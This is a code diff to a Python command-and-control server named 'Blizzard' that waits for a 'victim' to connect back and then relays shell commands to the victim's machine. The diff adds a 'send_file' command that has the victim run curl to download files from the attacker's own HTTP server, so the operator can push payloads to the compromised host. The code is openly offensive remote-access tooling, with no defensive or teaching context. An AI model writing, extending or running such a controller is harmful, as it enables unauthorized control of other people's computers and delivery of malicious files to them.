@@ -22,17 +22,18 @@ def main():
     server.bind((HOST, PORT))
     server.listen(1)
     print("WELCOME TO THE BLIZZARD!!!")
-
+    print("If you want to send the victim a file type the command: 'send_file example.txt' and make sure the file is in the directory you are running Blizzard from!")
+    print("")
+    print("Waiting for victim to connect...")
     # Start the HTTP server in a separate thread
     t1 = threading.Thread(target=http_server, args=(PORT_HTTP,))
     t1.daemon = True  # Ensures the HTTP server thread will close when the main thread closes
     t1.start()
-    print(f"HTTP server started on port {PORT_HTTP}")
-    print(f"Listening on port {PORT}")
-
+    print(f"Blizzard listening on port {PORT}")
     while True:
         client, address = server.accept()
         print(f"WE GOT ONE: {address[0]}")
+
 
         # Receive and send commands to the client
         try:
@@ -41,11 +42,13 @@ def main():
                 if command.lower() == "exit":
                     print("Closing connection.")
                     break
+                if command.startswith("send_file"):
+                    command = f"curl -O http://{HOST}:{PORT_HTTP}/{command.split()[1]}"
                 client.send(command.encode("utf-8"))
                 response = client.recv(1024).decode("utf-8")
                 print(response)
-        except ConnectionResetError:
-            print("Client disconnected.")
+        except:
+            print("The victim disconnected.")
         finally:
             client.close()
 
